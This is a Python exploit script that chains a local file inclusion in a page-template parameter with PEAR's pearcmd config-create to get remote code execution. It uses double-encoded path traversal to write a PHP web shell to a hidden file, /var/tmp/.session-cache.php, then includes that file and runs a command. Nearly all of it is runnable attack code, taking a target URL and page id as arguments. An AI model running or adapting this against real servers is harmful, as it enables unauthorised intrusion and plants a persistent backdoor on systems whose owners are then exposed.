#!/usr/bin/env python3
"""Minimal two-request reproduction of a page-template LFI to PEAR file write."""

import http.client
import sys
from urllib.parse import urlsplit


def late_decode_path(path):
    once = path.replace("/", "%2f").replace(".", "%2e")
    return once.replace("%", "%25")


def request(base, target, body):
    url = urlsplit(base)
    connection = http.client.HTTPConnection(url.hostname, url.port or 80)
    connection.request(
        "POST",
        target,
        body=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    response = connection.getresponse()
    data = response.read()
    connection.close()
    return data


def exploit(base, page_id):
    depth = "../" * 7
    pear = "templates/" + depth + "usr/share/php/pearcmd"
    drop = "/var/tmp/.session-cache.php"
    payload = "<?php system($_REQUEST['c']); ?>"

    writer_query = "/?+config-create+/" + payload + "+" + drop
    writer_body = "page_id=%d&pagename=%s" % (page_id, late_decode_path(pear))
    request(base, writer_query, writer_body)

    generated = "templates/" + depth + drop.lstrip("/")[:-4]
    loader_body = "page_id=%d&pagename=%s" % (page_id, late_decode_path(generated))
    return request(base, "/?c=id", loader_body)


if __name__ == "__main__":
    exploit(sys.argv[1], int(sys.argv[2]))
